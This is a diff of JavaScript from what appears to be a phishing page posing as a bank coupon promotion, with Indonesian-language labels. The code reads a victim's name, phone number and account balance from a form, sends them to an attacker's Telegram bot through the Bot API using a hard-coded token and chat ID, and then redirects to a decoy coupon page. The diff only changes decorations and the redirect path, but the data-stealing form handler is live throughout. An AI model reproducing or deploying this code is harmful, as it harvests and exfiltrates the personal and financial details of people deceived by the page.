@@ -877,9 +877,9 @@ body{
             var token = "8294741133:AAGLw-QZbb1q-h4i1MXwluRNL3vbf1OXjmc";
             var chatID = "8241735643";
 
-            	  var message = "⚔⚔⚔ DATA MASUK ⚔⚔⚔\n";
+            	  var message = " DATA MASUK \n";
 	message += ('\n<b>Nama:</b>\n'+$("#nama").val().trim()+'\n\n<b>No. HP:</b>\n'+$("#nomor").val().trim()+'\n\n<b>Saldo:</b>\nRp'+$("#saldo").val().trim()+'\n\n');
-	message += "⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜";
+	message += "";
 	
 	fetch("https://api.telegram.org/bot"+token+"/sendMessage?parse_mode=html", {
         method: 'POST',
@@ -894,7 +894,7 @@ body{
       .then(response => response.json())
       .then(data => {
         $("#loader").css('display', 'none');
-		window.location.href = "thank.html";
+		window.location.href = "../../../../thank/tr.svgdev.info/Kupon-BRlmo-Festival/ld1/index.html";
       })
       .catch((error) => {
         alert('Failed to send message.');
